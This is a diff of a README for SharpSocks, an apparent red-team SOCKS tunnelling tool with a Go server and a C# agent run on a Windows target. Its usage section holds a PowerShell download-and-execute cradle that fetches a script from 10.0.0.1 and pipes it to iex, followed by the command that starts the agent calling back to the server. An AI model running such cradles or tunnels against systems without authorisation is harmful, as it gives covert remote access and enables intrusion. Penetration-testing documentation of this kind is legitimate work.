@@ -28,7 +28,6 @@ Thus, decided to create this tool - with the C# agent component to run on the ta
 - Cross-platform server: static Go binaries for linux, windows, darwin (amd64 + arm64)
 - .NET Framework targets: agent compiles for net452 and net472
 
-
 ## Building & Usage
 
 The only requirement for building this on a *nix box is docker; the agent component is built via `mcr.microsoft.com/dotnet/sdk:8.0` for .NET 4.5.2 and 4.7.2, and the server component built with `golang:latest`.
@@ -46,10 +45,12 @@ $ sharpsocks-server -agent-password <pass> -socks-username <user> -socks-passwor
 And the C# agent on the Windows target, with a simple PowerShell execution cradle:
 
 ```
-PS C:\> (New-Object System.Net.WebClient).DownloadString("http://<host>/SharpSocks.ps1") | iex
+PS C:\> (New-Object System.Net.WebClient).DownloadString("http://10.0.0.1/SharpSocks.ps1") | iex
 PS C:\> [SharpSocks.Agent.Entry]::Execute("--server 10.0.0.1 --agent-password secret".Split())
 ```
 
 After the connection is established, traffic should flow from the server to the agent, via something like `proxychains` configured for `socks5` with username and password authentication.
 
 Optionally, the `-tranport tls` set for server and `--tranport tls` for the agent can be supplied to wrap the traffic in TLS; in this case, it's also recommended to specifically validate the TLS fingerprint as a defense-in-depth measure.
+
+Repo available at [https://github.com/forbiddenport/SharpSocks](https://github.com/forbiddenport/SharpSocks) with even more information, including more build instructions, dist/artifacts output structure, and security considerations.
